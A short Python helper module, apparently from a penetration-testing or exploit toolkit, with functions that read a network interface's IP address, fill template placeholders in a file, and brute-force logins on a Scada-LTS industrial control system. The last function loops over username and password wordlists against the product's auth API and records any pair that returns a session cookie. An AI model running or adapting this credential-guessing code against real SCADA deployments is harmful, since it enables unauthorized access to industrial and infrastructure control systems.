import socket
import fcntl
import struct
import requests
import itertools

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ret = socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', bytes(ifname[:15], 'utf-8'))
    )[20:24])
    s.close()

    return ret

def substitute_in_file(filename, tuple_to_insert):
    with open(filename, 'r') as f:
        data = f.read()
    with open(filename, 'w') as f:
        f.write(data % tuple_to_insert)

def bruteforce_password_scada(scada_url, username_file, password_file):
    with open(password_file, 'r') as f:
        passwords = [p.replace('\n', '') for p in f.readlines()]
    
    with open(username_file, 'r') as f:
        usernames = [p.replace('\n', '') for p in f.readlines()]

    found = []
    for user, pasw in itertools.product(usernames, passwords):
        res = requests.get(scada_url+f'/ScadaLTS/api/auth/{user}/{pasw}')
        if 'Set-Cookie' in res.headers:
            found.append((user, pasw))
    
    return found


    
